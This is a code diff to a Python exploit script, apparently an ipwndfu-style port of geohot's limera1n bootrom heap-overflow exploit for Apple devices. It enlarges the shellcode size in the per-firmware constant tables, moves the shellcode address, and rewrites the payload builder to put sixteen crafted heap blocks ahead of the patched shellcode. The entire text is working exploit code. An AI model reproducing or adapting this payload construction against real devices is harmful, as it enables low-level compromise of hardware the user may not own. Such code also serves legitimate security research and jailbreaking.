@@ -8,7 +8,7 @@ transfer_ptr = None
 
 constants_359_3 = [
     0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
-           512, #  2 - RELOCATE_SHELLCODE_SIZE
+          1024, #  2 - RELOCATE_SHELLCODE_SIZE
         0x83d4, #  3 - memmove
     0x84034000, #  4 - MAIN_STACK_ADDRESS
         0x43c9, #  5 - nor_power_on
@@ -33,7 +33,7 @@ constants_359_3 = [
 
 constants_359_3_2 = [
     0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
-           512, #  2 - RELOCATE_SHELLCODE_SIZE
+          1024, #  2 - RELOCATE_SHELLCODE_SIZE
         0x83dc, #  3 - memmove
     0x84034000, #  4 - MAIN_STACK_ADDRESS
         0x43d1, #  5 - nor_power_on
@@ -58,7 +58,7 @@ constants_359_3_2 = [
 
 constants_359_5 = [
     0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
-           512, #  2 - RELOCATE_SHELLCODE_SIZE
+          1024, #  2 - RELOCATE_SHELLCODE_SIZE
         0x8564, #  3 - memmove
     0x84034000, #  4 - MAIN_STACK_ADDRESS
         0x43b9, #  5 - nor_power_on
@@ -83,7 +83,7 @@ constants_359_5 = [
 
 constants_574_4 = [
     0x84039800, #  1 - RELOCATE_SHELLCODE_ADDRESS
-           512, #  2 - RELOCATE_SHELLCODE_SIZE
+          1024, #  2 - RELOCATE_SHELLCODE_SIZE
         0x84dc, #  3 - memmove
     0x8403c000, #  4 - MAIN_STACK_ADDRESS
         0x4e8d, #  5 - nor_power_on
@@ -157,8 +157,8 @@ def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue
     assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0
 
 def generate_payload(chosenConfig):
-    SHELLCODE_ADDRESS = 0x84000000 + 1
-    MAX_SHELLCODE_LENGTH = 384
+    SHELLCODE_ADDRESS = 0x84000400 + 1
+    MAX_SHELLCODE_LENGTH = 1024
     f = open('bin/limera1n-shellcode.bin', 'rb')
     shellcode = f.read()
     f.close()
@@ -171,9 +171,9 @@ def generate_payload(chosenConfig):
         (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
         assert value == 0xBAD00001 + i
 
-    shellcode = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(chosenConfig.constants), *chosenConfig.constants)
     heap_block = struct.pack('<4I', 0x405, 0x101, SHELLCODE_ADDRESS, chosenConfig.exploit_lr) + '\xCC' * 48
-    return shellcode + '\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode)) + heap_block * 10
+    shellcode = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(chosenConfig.constants), *chosenConfig.constants)
+    return heap_block * 16 + shellcode
 
 def exploit():
     print '*** based on limera1n exploit (heap overflow) by geohot ***'
